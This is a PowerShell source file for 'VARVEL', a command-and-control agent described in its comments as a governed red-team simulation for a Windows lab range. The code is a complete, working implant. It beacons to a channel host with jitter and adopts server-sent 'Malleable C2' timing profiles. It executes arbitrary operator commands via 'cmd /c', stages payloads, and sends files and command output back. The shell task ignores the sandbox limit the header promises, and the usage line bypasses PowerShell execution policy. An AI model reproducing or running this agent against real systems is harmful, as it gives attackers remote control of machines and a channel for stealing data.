# VARVEL - real first-stage agent for the authorized range (Windows / Win11 VM).
#
# This is a REAL callback-channel agent: it speaks the exact protocol the governed channel
# serves - HMAC-SHA256-signed check-ins with strictly-increasing sequences, task pull on
# GET, HMAC-bound results on POST, sha256-verified artifact staging, fetch-back, jittered
# cadence. Pure PowerShell, no dependencies, fileless-friendly for the practice range.
#
# GOVERNANCE (unchanged, by design):
#   - It runs ONLY where the operator puts it, on a signed-scope range target (the Win11
#     lab). The channel enforces scope + kill-list server-side; the agent has no say.
#   - No persistence, no privilege tricks, no anti-forensics, no evasion. Its job is to
#     be a faithful post-ex SIMULATION for governed red-team work - a real session the
#     operator can task, stage to, and pull from - not a covert implant.
#   - Every action is confined to its sandbox directory unless the operator explicitly
#     tasks otherwise. Artifact staging verifies sha256 before anything is written.
#
# Usage (on the range target):
#   powershell -ExecutionPolicy Bypass -File varvel-agent.ps1 -Url http://<channel-host>:<port> -AgentId <id> -Token <hex> [-Sandbox .\agentbox] [-Interval 3000] [-Jitter 2000] [-MaxLoops 0]

param(
  [Parameter(Mandatory=$true)][string]$Url,
  [Parameter(Mandatory=$true)][string]$AgentId,
  [Parameter(Mandatory=$true)][string]$Token,
  [string]$Sandbox = (Join-Path $PWD 'agentbox'),
  [int]$Interval = 3000,
  [int]$Jitter = 2000,
  [int]$MaxLoops = 0          # 0 = run until killed (Ctrl-C / channel kill)
)

$ErrorActionPreference = 'Stop'
$Url = $Url.TrimEnd('/')
New-Item -ItemType Directory -Force -Path $Sandbox | Out-Null
$Sandbox = (Resolve-Path $Sandbox).Path
$script:Seq = 0

function Get-HmacHex([string]$Key, [string]$Message) {
  $h = [System.Security.Cryptography.HMACSHA256]::new([Text.Encoding]::UTF8.GetBytes($Key))
  try { return ([BitConverter]::ToString($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($Message)))).Replace('-','').ToLower() }
  finally { $h.Dispose() }
}
function Get-Sha256Hex([byte[]]$Bytes) {
  $s = [System.Security.Cryptography.SHA256]::Create()
  try { return ([BitConverter]::ToString($s.ComputeHash($Bytes))).Replace('-','').ToLower() }
  finally { $s.Dispose() }
}
function Resolve-Sandbox([string]$Path) {
  $full = if ([IO.Path]::IsPathRooted($Path)) { [IO.Path]::GetFullPath($Path) } else { [IO.Path]::GetFullPath((Join-Path $Sandbox $Path)) }
  if (-not $full.StartsWith($Sandbox, [StringComparison]::OrdinalIgnoreCase)) { throw "path outside sandbox: $Path" }
  return $full
}

function Invoke-Pull {
  $script:Seq++
  $auth = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':pull')
  try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('x-agent', $AgentId)
    $wc.Headers.Add('x-seq', "$($script:Seq)")
    $wc.Headers.Add('x-auth', $auth)
    $bytes = $wc.DownloadData("$Url/c")
    # Malleable C2: adopt a channel-assigned timing profile live (interval+jitter; burst v2)
    $prof = $wc.ResponseHeaders['x-varvel-profile']
    if ($prof) {
      try {
        $p = $prof | ConvertFrom-Json
        $script:Interval = [Math]::Max(200, [int]$p.intervalMs)
        $script:Jitter = [Math]::Max(0, [int]$p.jitterMs)
      } catch {}
    }
    if ($null -eq $bytes -or $bytes.Length -eq 0) { return $null }  # 204 = idle
    return ([Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
  } catch [System.Net.WebException] { return $null }  # non-2xx (incl. killed-agent 204s) = idle to us
  catch { Write-Host ('  [pull error: ' + $_.Exception.Message + ']'); return $null }
}

function Invoke-Push([string]$TaskId, [byte[]]$Body) {
  $script:Seq++
  $hash = Get-Sha256Hex $Body
  $auth = Get-HmacHex $Token ($AgentId + ':' + $script:Seq + ':' + $TaskId + ':' + $hash)
  try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('x-agent', $AgentId)
    $wc.Headers.Add('x-seq', "$($script:Seq)")
    $wc.Headers.Add('x-task', $TaskId)
    $wc.Headers.Add('x-auth', $auth)
    $wc.UploadData("$Url/r", 'POST', $Body) | Out-Null
  } catch { Write-Host ('  [push failed: ' + $_.Exception.Message + ']') }
}

function Invoke-Task($Task) {
  switch ($Task.kind) {
    'shell' {
      $out = cmd /c "$($Task.data) 2>&1" | Out-String
      if ($out.Length -gt 60000) { $out = $out.Substring(0, 60000) }
      return [Text.Encoding]::UTF8.GetBytes($out.Trim())
    }
    'fetch' {
      try {
        $spec = $Task.data | ConvertFrom-Json
        return [IO.File]::ReadAllBytes((Resolve-Sandbox $spec.path))
      } catch { return [Text.Encoding]::UTF8.GetBytes("fetch failed: $($_.Exception.Message)") }
    }
    'stage' {
      try {
        $spec = $Task.data | ConvertFrom-Json
        $bytes = [Convert]::FromBase64String($spec.b64)
        $hash = Get-Sha256Hex $bytes
        if ($hash -ne $spec.sha256) { return [Text.Encoding]::UTF8.GetBytes('stage REJECTED: sha256 mismatch (tampered or truncated delivery)') }
        $dest = Resolve-Sandbox (Split-Path $spec.name -Leaf)
        [IO.File]::WriteAllBytes($dest, $bytes)
        return [Text.Encoding]::UTF8.GetBytes("staged $($spec.name) ($($bytes.Length) bytes, sha256 verified)")
      } catch { return [Text.Encoding]::UTF8.GetBytes("stage failed: $($_.Exception.Message)") }
    }
    'note' { return [Text.Encoding]::UTF8.GetBytes("noted: $($Task.data)") }
    default { return [Text.Encoding]::UTF8.GetBytes("unknown task kind: $($Task.kind)") }
  }
}

Write-Host "varvel-agent $AgentId -> $Url - sandbox $Sandbox - cadence $Interval+/-$Jitter ms"
Write-Host "  governed simulation agent - no persistence, no evasion. Ctrl-C to exit."
$loops = 0
while ($true) {
  $loops++
  if ($MaxLoops -gt 0 -and $loops -gt $MaxLoops) { break }
  $task = Invoke-Pull
  if ($null -ne $task) {
    $preview = $task.data
    if ($preview.Length -gt 60) { $preview = $preview.Substring(0, 60) }
    Write-Host ('  task ' + $task.kind + ': ' + $preview)
    $result = Invoke-Task $task
    Invoke-Push $task.taskId $result
    Write-Host ('  result sent (' + $result.Length + 'b)')
  }
  $gap = $Interval + (Get-Random -Minimum (-$Jitter) -Maximum ($Jitter + 1))
  Start-Sleep -Milliseconds ([Math]::Max(200, $gap))
}
